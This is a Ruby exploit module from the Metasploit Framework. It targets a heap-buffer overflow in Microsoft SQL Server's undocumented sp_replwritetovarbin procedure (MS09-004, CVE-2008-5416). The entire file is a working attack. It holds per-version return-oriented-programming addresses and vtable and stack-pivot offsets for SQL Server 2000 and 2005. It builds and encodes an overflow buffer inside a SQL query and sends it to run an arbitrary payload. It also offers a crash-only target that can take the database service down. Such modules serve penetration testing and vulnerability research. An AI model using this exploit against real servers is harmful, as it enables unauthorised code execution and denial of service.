##
# $Id: ms09_004_sp_replwritetovarbin.rb 11631 2011-01-24 19:37:58Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::MSSQL

	def initialize(info = {})

		super(update_info(info,
			'Name'           => 'Microsoft SQL Server sp_replwritetovarbin Memory Corruption',
			'Description'    => %q{
					A heap-based buffer overflow can occur when calling the undocumented
				"sp_replwritetovarbin" extended stored procedure. This vulnerability affects
				all versions of Microsoft SQL Server 2000 and 2005, Windows Internal Database,
				and Microsoft Desktop Engine (MSDE) without the updates supplied in MS09-004.
				Microsoft patched this vulnerability in SP3 for 2005 without any public
				mention.

				An authenticated database session is required to access the vulnerable code.
				That said, it is possible to access the vulnerable code via an SQL injection
				vulnerability.

				This exploit smashes several pointers, as shown below.

				1. pointer to a 32-bit value that is set to 0
				2. pointer to a 32-bit value that is set to a length influcenced by the buffer
					length.
				3. pointer to a 32-bit value that is used as a vtable pointer. In MSSQL 2000,
					this value is referenced with a displacement of 0x38. For MSSQL 2005, the
					displacement is 0x10. The address of our buffer is conveniently stored in
					ecx when this instruction is executed.
				4. On MSSQL 2005, an additional vtable ptr is smashed, which is referenced with
					a displacement of 4. This pointer is not used by this exploit.

				This particular exploit replaces the previous dual-method exploit. It uses
				a technique where the value contained in ecx becomes the stack. From there,
				return oriented programming is used to normalize the execution state and
				finally execute the payload via a "jmp esp". All addresses used were found
				within the sqlservr.exe memory space, yielding very reliable code execution
				using only a single query.

				NOTE: The MSSQL server service does not automatically restart by default. That
				said, some exceptions are caught and will not result in terminating the process.
				If the exploit crashes the service prior to hijacking the stack, it won't die.
				Otherwise, it's a goner.
			},
			'Author'         => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11631 $',
			'References'     =>
				[
					[ 'OSVDB', '50589' ],
					[ 'CVE', '2008-5416' ],
					[ 'BID', '32710' ],
					[ 'MSB', 'MS09-004' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/7501' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "", # bad bytes get encoded!
					'PrependEncoder' => "\x81\xc4\xf0\xef\xff\xff",
					'DisableNops' => true
				},
			'Platform'       => 'win',
			'Privileged'     => true,
			'Targets'        =>
				[
					# auto targeting!
					[ 'Automatic', { } ],

					#
					# Individual targets
					#
					[
						# Microsoft SQL Server  2000 - 8.00.194 (Intel X86)
						# Aug  6 2000 00:57:48
						'MSSQL 2000 / MSDE SP0 (8.00.194)',
						{
							'Num'      => 32,          # value for "start_offset"
							'VtOff'    => -13,         # offset from 'Num' to smashed vtable ptr
							'VtDisp'   => 0x38,        # displacement from call [eax+0x38] crash
							'Writable' => 0x42b6cfe0,  # any writable addr (not even necessary really)
							'Vtable'   => 0x00a87f26,  # becomes eax for [eax+0x38] (must be valid to exec)
							'FixDisp'  => 0x6900a7,    # not directly used - call [ecx+0x08]
							'Disp'     => 0x08,        # displacement on call [ecx+disp] used
							'ecx2esp'  => 0x0041b78f,  # xchg ecx,esp / sbb [eax],al / pop esi / ret
							'Popped'   => 0x4,         # byte count popped in above (before ret)
							'Offset'   => 0x28,        # offset to the new stack!
							'FixESP'   => 0x0071f5fb,  # advance esp to next ret (add esp,0x20 / ret)
							'Ret'      => 0x0041c9a2   # jmp esp
						},
					],

					[
						# Microsoft SQL Server  2000 - 8.00.384 (Intel X86)
						# May 23 2001 00:02:52
						'MSSQL 2000 / MSDE SP1 (8.00.384)',
						{
							'Num'      => 32,          # value for "start_offset"
							'VtOff'    => -13,         # offset from 'Num' to smashed vtable ptr
							'VtDisp'   => 0x38,        # displacement from call [eax+0x38] crash
							'Writable' => 0x42b6cfe0,  # any writable addr (not even necessary really)
							'Vtable'   => 0x00a95b2f,  # becomes eax for [eax+0x38] (must be valid to exec)
							'FixDisp'  => 0x4b4f00,    # not directly used - call [ecx-0x18]
							'Disp'     => 0x34,        # displacement on call [ecx+disp] used
							'ecx2esp'  => 0x0044d300,  # xchg ecx,esp / add [eax],al / add [edi+0x5e],bl / pop ebx / pop ebp / ret
							'Popped'   => 0x8,         # byte count popped in above (before ret)
							'Offset'   => 0x28,        # offset to the new stack!
							'FixESP'   => 0x004a2ce9,  # advance esp to next ret (add esp,0x1c / ret)
							'Ret'      => 0x004caa15   # jmp esp
						},
					],

					[
						# Microsoft SQL Server  2000 - 8.00.534 (Intel X86)
						# Nov 19 2001 13:23:50
						'MSSQL 2000 / MSDE SP2 (8.00.534)',
						{
							'Num'      => 32,          # value for "start_offset"
							'VtOff'    => -13,         # offset from 'Num' to smashed vtable ptr
							'VtDisp'   => 0x38,        # displacement from call [eax+0x38] crash
							'Writable' => 0x42b6cfe0,  # any writable addr (not even necessary really)
							'Vtable'   => 0x00a64f7e,  # becomes eax for [eax+0x38] (must be valid to exec)
							'FixDisp'  => 0x660077,    # not directly used - call [ecx-0x18]
							'Disp'     => 0x34,        # displacement on call [ecx+disp] used
							'ecx2esp'  => 0x0054131c,  # xchg ecx,esp / add [eax],al / add [edi+0x5e],bl / pop ebx / pop ebp / ret
							'Popped'   => 0x8,         # byte count popped in above (before ret)
							'Offset'   => 0x28,        # offset to the new stack!
							'FixESP'   => 0x005306a0,  # advance esp to next ret (add esp,0x1c / ret)
							'Ret'      => 0x004ca984   # jmp esp
						},
					],

					[
						# Microsoft SQL Server  2000 - 8.00.760 (Intel X86)
						# Dec 17 2002 14:22:05
						'MSSQL 2000 / MSDE SP3 (8.00.760)',
						{
							'Num'      => 32,          # value for "start_offset"
							'VtOff'    => -13,         # offset from 'Num' to smashed vtable ptr
							'VtDisp'   => 0x38,        # displacement from call [eax+0x38] crash
							'Writable' => 0x42b6cfe0,  # any writable addr (not even necessary really)
							'Vtable'   => 0x00ac344e,  # becomes eax for [eax+0x38] (must be valid to exec)
							'FixDisp'  => 0x490074,    # not directly used - call [ecx+0x14]
							'Disp'     => 0x34,        # displacement on call [ecx+disp] used
							'ecx2esp'  => 0x00454303,  # xchg ecx,esp / add [eax],al / add [edi+0x5e],bl / pop ebx / pop ebp / ret
							'Popped'   => 0x8,         # byte count popped in above (before ret)
							'Offset'   => 0x28,        # offset to the new stack!
							'FixESP'   => 0x00503413,  # advance esp to next ret (add esp,0x20 / ret)
							'Ret'      => 0x0043fa97   # jmp esp
						},
					],

					[
						# Microsoft SQL Server  2000 - 8.00.2039 (Intel X86)
						# May  3 2005 23:18:38
						'MSSQL 2000 / MSDE SP4 (8.00.2039)',
						{
							'Num'      => 32,          # value for "start_offset"
							'VtOff'    => -13,         # offset from 'Num' to smashed vtable ptr
							'VtDisp'   => 0x38,        # displacement from call [eax+0x38] crash
							'Writable' => 0x42b6cfe0,  # any writable addr (not even necessary really)
							'Vtable'   => 0x0046592e,  # becomes eax for [eax+0x38] (must be valid to exec)
							'FixDisp'  => 0x69f5e8,    # not directly used - call [ecx+0x14]
							'Disp'     => 0x14,        # displacement on call [ecx+disp] used
							'ecx2esp'  => 0x007b39a8,  # push ecx / pop esp / mov ax,[eax+0x18] / mov [ecx+0x62],ax / pop ebp / ret 0x4
							'Popped'   => 0x4,         # byte count popped in above (before ret)
							'Offset'   => 0x20,        # offset to the new stack!
							'FixESP'   => 0x00b3694d,  # advance esp to next ret (add esp,0x20 / ret)
							'Ret'      => 0x0047c89d   # jmp esp
						},
					],

					[
						# Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86)
						# Oct 14 2005 00:33:37
						'MSSQL 2005 SP0 (9.00.1399.06)',
						{
							'Num'      => 32,          # value for "start_offset"
							'VtOff'    => 63,          # offset from 'Num' to smashed vtable ptr
							'VtDisp'   => 0x10,        # displacement from mov eax,[edx+0x10] / call eax crash
							'Writable' => 0x53ad5330,  # any writable addr (not even necessary really)
							'Vtable'   => 0x02201ca8,  # becomes eax for [eax+0x38] (must be valid to exec)
							'FixDisp'  => 0x10e860f,   # not directly used - call [ecx+0x14]
							'Disp'     => 0x50,        # displacement on call [ecx+disp] used
							'ecx2esp'  => 0x0181c0d4,  # push ecx / pop esp / pop ebp / ret
							'Popped'   => 0x4,         # byte count popped in above (before ret)
							'Offset'   => 0x20,        # offset to the new stack!
							'FixESP'   => 0x0147deb7,  # advance esp to next ret (add esp,0x10 / ret)
							'Ret'      => 0x0112c2c7   # jmp esp
						},
					],

					[
						# Microsoft SQL Server 2005 - 9.00.2047.00 (Intel X86)
						# Apr 14 2006 01:12:25
						'MSSQL 2005 SP1 (9.00.2047.00)',
						{
							'Num'      => 32,          # value for "start_offset"
							'VtOff'    => 63,          # offset from 'Num' to smashed vtable ptr
							'VtDisp'   => 0x10,        # displacement from mov eax,[edx+0x10] / call eax crash
							'Writable' => 0x53ad5330,  # any writable addr (not even necessary really)
							'Vtable'   => 0x0244c803,  # becomes eax for [eax+0x38] (must be valid to exec)
							'FixDisp'  => 0x17139e9,   # not directly used - call [ecx+0x14]
							'Disp'     => 0x52,        # displacement on call [ecx+disp] used
							'ecx2esp'  => 0x0183bf9c,  # push ecx / pop esp / pop ebp / ret
							'Popped'   => 0x4,         # byte count popped in above (before ret)
							'Offset'   => 0x20,        # offset to the new stack!
							'FixESP'   => 0x014923c1,  # advance esp to next ret (add esp,0x10 / ret)
							'Ret'      => 0x011b204c   # jmp esp
						},
					],

					[
						# Microsoft SQL Server 2005 - 9.00.3042.00 (Intel X86)
						# Feb  9 2007 22:47:07
						'MSSQL 2005 SP2 (9.00.3042.00)',
						{
							'Num'      => 32,          # value for "start_offset"
							'VtOff'    => 63,          # offset from 'Num' to smashed vtable ptr
							'VtDisp'   => 0x10,        # displacement from mov eax,[edx+0x10] / call eax crash
							'Writable' => 0x53ad5330,  # any writable addr (not even necessary really)
							'Vtable'   => 0x027fca52,  # becomes eax for [eax+0x38] (must be valid to exec)
							'FixDisp'  => 0x1106d6b,   # not directly used - call [ecx+0x14]
							'Disp'     => 0x52,        # displacement on call [ecx+disp] used
							'ecx2esp'  => 0x01849641,  # push ecx / pop esp / pop ebp / ret
							'Popped'   => 0x4,         # byte count popped in above (before ret)
							'Offset'   => 0x20,        # offset to the new stack!
							'FixESP'   => 0x01498b22,  # advance esp to next ret (add esp,0x10 / ret)
							'Ret'      => 0x010a5379   # jmp esp
						},
					],

					[ 'CRASHER', { } ]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Dec 09 2008'
			))

		register_options(
			[
				OptBool.new('VERBOSE', [ false, 'Enable verbose output', false ])
			])
	end

	def check
		# the ping to port 1434 method has two drawbacks...
		# #1, it doesn't work on mssql 2005 or newer (localhost only listening)
		# #2, it doesn't give an accurate version number (sp/os)

		# since we need to have credentials for this vuln, we just login and run a query
		# to get the version information
		if not (version = mssql_query_version())
			return Exploit::CheckCode::Safe
		end
		print_status("@@version returned:\n\t" + version)

		# Any others?
		return Exploit::CheckCode::Vulnerable if (version =~ /8\.00\.194/)
		return Exploit::CheckCode::Vulnerable if (version =~ /8\.00\.384/)
		return Exploit::CheckCode::Vulnerable if (version =~ /8\.00\.534/)
		return Exploit::CheckCode::Vulnerable if (version =~ /8\.00\.760/)
		return Exploit::CheckCode::Vulnerable if (version =~ /8\.00\.2039/)
		return Exploit::CheckCode::Vulnerable if (version =~ /9\.00\.1399\.06/)
		return Exploit::CheckCode::Vulnerable if (version =~ /9\.00\.2047\.00/)
		return Exploit::CheckCode::Vulnerable if (version =~ /9\.00\.3042\.00/)
		return Exploit::CheckCode::Safe
	end

	def exploit

		mytarget = nil
		if target.name =~ /Automatic/
			print_status("Attempting automatic target detection...")

			version = mssql_query_version
			raise RuntimeError, "Unable to get version!" if not version

			if (version =~ /8\.00\.194/)
				mytarget = targets[1]
			elsif (version =~ /8\.00\.384/)
				mytarget = targets[2]
			elsif (version =~ /8\.00\.534/)
				mytarget = targets[3]
			elsif (version =~ /8\.00\.760/)
				mytarget = targets[4]
			elsif (version =~ /8\.00\.2039/)
				mytarget = targets[5]
			elsif (version =~ /9\.00\.1399\.06/)
				mytarget = targets[6]
			elsif (version =~ /9\.00\.2047\.00/)
				mytarget = targets[7]
			elsif (version =~ /9\.00\.3042\.00/)
				mytarget = targets[8]
			end

			if mytarget.nil?
				raise RuntimeError, "Unable to automatically detect the target"
			else
				print_status("Automatically detected target \"#{mytarget.name}\"")
			end
		else
			mytarget = target
		end

		sqlquery = %Q|declare @i int,@z nvarchar(4000)
set @z='declare @e int,@b varbinary,@l int;'
set @z=@z+'exec sp_replwritetovarbin %NUM%,@e out,@b out,@l out,''%STUFF%'',@l,@l,@l,@l,@l,@l,@l,@l'
exec sp_executesql @z|

		# just crash it with a pattern buffer if the CRASHER target is selected..
		if mytarget.name == 'CRASHER'
			sploit = Rex::Text.pattern_create(2048)
			print_status("Attempting to corrupt memory to cause an exception!")
			num = 32
		else
			# trigger the memory corruption
			num = mytarget['Num']
			vt_off = mytarget['VtOff']
			vt_disp = mytarget['VtDisp']
			vtable = mytarget['Vtable']
			ecx_disp = mytarget['Disp']
			esp_off = mytarget['Offset']
			hijack_esp = mytarget['ecx2esp']
			first_esp = mytarget['Popped']
			fix_esp = mytarget['FixESP']
			writable = mytarget['Writable']
			corruptable_bytes = 0x44

			# make sploit buff
			sz = (num + vt_off) + esp_off + (2 + corruptable_bytes) + payload.encoded.length
			#sploit = Rex::Text.pattern_create(sz)
			sploit = rand_text_alphanumeric(sz)

			# remove displacement! (using call [ecx+displacement])
			vtable_off = (num + vt_off)
			sploit[vtable_off,4] = [(vtable - vt_disp)].pack('V')

			# stack -> heap
			hijack_off = vtable_off + ecx_disp
			sploit[hijack_off,4] = [hijack_esp].pack('V')
			# becomes eax on mssql 2ksp4 (prevent crash)
			sploit[(vtable_off-4),4] = [writable].pack('V')

			# becomes eip after esp hijack
			fixesp_off = vtable_off + first_esp
			sploit[fixesp_off,4] = [fix_esp].pack('V')

			# rest of magic stack (disable DEP?)
			stack_off = vtable_off + esp_off
			stack = []
			stack << mytarget['Ret']
			stack = stack.pack('V*')
			# jump over the stuff that gets corrupted
			stack << "\xeb" + [corruptable_bytes].pack('C')
			stack << rand_text_alphanumeric(corruptable_bytes)
			stack << payload.encoded
			sploit[stack_off,stack.length] = stack

			# this has to be put in after the stack area since the ptr for sql2k sp1 is in the corrupted stuff
			sploit[hijack_off,4] = [hijack_esp].pack('V')

			print_status("Redirecting flow to %#x via call to our faked vtable ptr @ %#x" % [mytarget['FixDisp'], vtable])
		end

		# encode chars that get modified
		enc = mssql_encode_string(sploit)

		# put the number in (start offset)
		runme = sqlquery.gsub(/%NUM%/, num.to_s)
		runme.gsub!(/%STUFF%/, enc)

		# go!
		if (not mssql_login_datastore)
			raise RuntimeError, "Unable to log in!"
		end
		begin
			mssql_query(runme, datastore['VERBOSE'])
		rescue ::Errno::ECONNRESET, EOFError
			print_error("Error: #{$!}")
		end

		handler
		disconnect
	end


	def mssql_str_to_chars(str)
		ret = ""
		str.unpack('C*').each do |ch|
			ret += "+" if ret.length > 0
			ret += "char("
			ret << ch.to_s
			ret += ")"
		end
		return ret
	end


	def mssql_encode_string(str)
		badchars = "\x00\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9e\x9f"

		enc = ""
		in_str = true
		str.unpack('C*').each do |ch|
			# double-double single quotes
			if ch == 0x27
				if not in_str
					enc << "+'"
					in_str = true
				end
				enc << ch.chr * 4
				next
			end

			# double backslashes
			if ch == 0x5c
				if not in_str
					enc << "+'"
					in_str = true
				end
				enc << ch.chr * 2
				next
			end

			# convert any bad stuff to char(0xXX)
			if ((idx = badchars.index(ch.chr)))
				enc << "'" if in_str
				enc << "+char(0x%x)" % ch
				in_str = false
			else
				enc << "+'" if not in_str
				enc << ch.chr
				in_str = true
			end
		end
		enc << "+'" if not in_str
		return enc
	end


	def mssql_query_version
		begin
			logged_in = mssql_login_datastore
		rescue ::Rex::ConnectionError, ::Errno::ECONNRESET, ::Errno::EINTR
			return nil
		end

		if (not logged_in)
			raise RuntimeError, "Invalid SQL Server credentials"
		end
		res = mssql_query("select @@version", datastore['VERBOSE'])
		disconnect

		return nil if not res
		if res[:errors] and not res[:errors].empty?
			errstr = ""
			res[:errors].each do |err|
				errstr << err
			end
			raise RuntimeError, errstr
		end

		if not res[:rows] or res[:rows].empty?
			return nil
		end

		return res[:rows][0][0]
	end

end
